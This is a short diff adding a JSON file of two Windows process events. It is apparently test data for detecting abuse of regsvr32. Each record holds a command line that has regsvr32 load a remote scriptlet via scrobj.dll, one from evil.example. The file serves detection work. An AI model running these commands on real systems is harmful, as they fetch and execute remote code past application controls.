@@ -1,0 +1,10 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\regsvr32.exe",
+    "CommandLine": "regsvr32.exe /s /n /u /i:http://evil.example/payload.sct scrobj.dll"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\regsvr32.exe",
+    "CommandLine": "regsvr32 /i:https://host/a.sct scrobj.dll"
+  }
+]
